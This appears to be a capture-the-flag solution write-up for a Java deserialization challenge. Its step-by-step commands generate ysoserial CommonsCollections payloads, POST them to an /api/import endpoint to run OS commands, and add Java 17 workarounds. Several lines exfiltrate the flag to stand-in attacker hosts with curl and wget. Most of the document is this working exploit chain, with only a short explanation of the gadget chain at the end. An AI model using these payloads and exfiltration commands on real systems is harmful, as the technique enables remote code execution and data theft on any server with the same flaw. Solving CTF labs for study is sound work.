# Java Deserialization RCE - Solution

## Vulnerability

The `/api/import` endpoint accepts base64-encoded Java serialized objects and deserializes them
without any validation using `ObjectInputStream.readObject()`. The classpath includes
**Apache Commons Collections 3.2.1**, which has well-known gadget chains exploitable
via ysoserial.

## Prerequisites

- Java 8+ on attacker machine
- ysoserial tool

## Exploit Steps

### Step 1: Download ysoserial

```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
# Or compile from source: https://github.com/frohoff/ysoserial
```

### Step 2: Generate payload

The CommonsCollections6 gadget chain works with Java 17+ (no reflective access issues):

```bash
# Write flag to readable location
java -jar ysoserial-all.jar CommonsCollections6 \
  "cp /app/flag.txt /tmp/flag_out.txt && chmod 644 /tmp/flag_out.txt" \
  | base64 -w 0 > payload.b64
```

### Step 3: Send the payload

```bash
curl -X POST http://TARGET:8080/api/import \
  -H "Content-Type: application/json" \
  -d "{\"data\": \"$(cat payload.b64)\"}"
```

The server will execute the command and return an error (since the gadget chain result
isn't a normal object), but the command will have run.

### Step 4: Read the flag

Since the challenge has a web endpoint, you can exfiltrate via another command:

```bash
# Write flag to a web-accessible location or use curl to exfiltrate
java -jar ysoserial-all.jar CommonsCollections6 \
  "curl -o /dev/null http://ATTACKER:9999/$(cat /app/flag.txt | base64)" \
  | base64 -w 0 > payload2.b64
```

Or simply write to a fixed path and use another payload to read:

```bash
# Payload 1: copy flag
java -jar ysoserial-all.jar CommonsCollections6 "cp /app/flag.txt /tmp/f" | base64 -w 0 > p.b64
curl -X POST http://TARGET:8080/api/import -H "Content-Type: application/json" -d "{\"data\":\"$(cat p.b64)\"}"

# Payload 2: exfil via DNS/HTTP to your listener
java -jar ysoserial-all.jar CommonsCollections6 "wget -O- http://ATTACKER:4444/collect?flag=$(cat /tmp/f)" | base64 -w 0 > p2.b64
curl -X POST http://TARGET:8080/api/import -H "Content-Type: application/json" -d "{\"data\":\"$(cat p2.b64)\"}"
```

### Notes on Java 17

Java 17 has strong encapsulation. Some gadget chains (CommonsCollections1, 2, 3, 4) require
`--add-opens` JVM flags. CommonsCollections5, 6, and 7 typically work without these flags.

If CommonsCollections6 fails, try:

```bash
java --add-opens java.base/java.lang=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections1 "cp /app/flag.txt /tmp/flag_out.txt" \
     | base64 -w 0 > payload.b64
```

## How the gadget chain works

1. `ObjectInputStream.readObject()` triggers deserialization
2. CommonsCollections gadget chain uses `InvokerTransformer` to invoke `Runtime.exec()`
3. The chain is set up such that deserializing the object triggers arbitrary method invocation
4. Result: OS command execution as the Java process user
